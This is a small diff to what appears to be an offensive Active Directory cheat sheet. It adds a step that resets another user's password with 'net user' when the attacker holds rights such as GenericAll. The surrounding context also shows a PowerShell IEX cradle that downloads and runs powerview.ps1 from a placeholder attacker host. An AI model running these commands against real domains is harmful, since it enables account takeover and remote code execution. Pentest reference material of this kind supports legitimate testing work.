@@ -47,6 +47,12 @@ BloodyAD -> `bloodyAD -k --host <machine.domain> -d <domain> -u '<user>' -p '<pa
 
 ### From Windows (internally):
 
+If your user have enought rights (like GenericAll, for example) you can try to change the password directly.
+
+`net user <target user> <new password>`
+
+If not allowed try with the following method:
+
 Load powerview -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`
 
 `$NewPassword = ConvertTo-SecureString '<new_password>' -AsPlainText -Force`
